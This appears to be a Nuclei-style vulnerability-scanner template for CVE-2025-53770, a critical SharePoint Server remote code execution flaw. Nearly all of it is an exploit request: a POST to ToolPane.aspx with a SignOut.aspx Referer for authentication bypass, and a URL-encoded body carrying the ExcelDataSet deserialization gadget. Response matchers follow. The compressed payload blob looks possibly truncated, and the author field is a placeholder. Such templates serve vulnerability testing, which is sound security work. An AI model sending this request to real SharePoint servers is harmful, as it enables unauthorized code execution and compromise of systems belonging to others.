id: CVE-2025-53770

info:
  name: Microsoft SharePoint Server Remote Code Execution Vulnerability
  author: YourName
  severity: critical
  description: |
    Microsoft SharePoint Server is vulnerable to remote code execution via improper control
    of generation of code in ToolPane.aspx page.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-53770
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-53770
  tags: cve,cve2025,sharepoint,rce,microsoft

http:
  - method: POST
    path:
      - "{{BaseURL}}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
      Content-Type: application/x-www-form-urlencoded
      Referer: {{BaseURL}}/_layouts/SignOut.aspx
      Connection: close

    body: |
      MSOTlPn_Uri=http%3A%2F%2Fwww.itsc.org%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%0A++++%3C%25%40+Register+Tagprefix%3D%22Scorecard%22+Namespace%3D%22Microsoft.PerformancePoint.Scorecards%22+Assembly%3D%22Microsoft.PerformancePoint.Scorecards.Client%2C+Version%3D16.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D71e9bce111e9429c%22+%25%3E%0A++++%3C%25%40+Register+Tagprefix%3D%22asp%22+Namespace%3D%22System.Web.UI%22+Assembly%3D%22System.Web.Extensions%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3D31bf3856ad364e35%22+%25%3E%0A%0A%3Casp%3AUpdateProgress+ID%3D%22UpdateProgress1%22+DisplayAfter%3D%2210%22+%0Arunat%3D%22server%22+AssociatedUpdatePanelID%3D%22upTest%22%3E%0A%3CProgressTemplate%3E%0A++%3Cdiv+class%3D%22divWaiting%22%3E++++++++++++%0A++++%3CScorecard%3AExcelDataSet+CompressedDataTable%3D%22H4sIAAAAAAAEANVa23LbSJLt3stEzMzu0%2F6AQs%2B2BJCiu%2BWQHUGQLIi0CAkgUSAw4YjBzeIFANm8i3%2Bz37MftXsyCyRlW7ZF%2F3s7PzE4Xq%2FOPv%2FwM%3D%22+DataTable-CaseSensitive%3D%22false%22+runat%3D%22server%22%3E%0A%3C%2FScorecard%3AExcelDataSet%3E%0A++%3C%2Fdiv%3E%0A%3C%2FProgressTemplate%3E%0A%3C%2Fasp%3AUpdateProgress%3E%0A++++

    matchers:
      - type: word
        words:
          - "Microsoft.PerformancePoint.Scorecards"
          - "ExcelDataSet"
          - "CompressedDataTable"
        condition: and
        part: body

      - type: status
        status:
          - 200
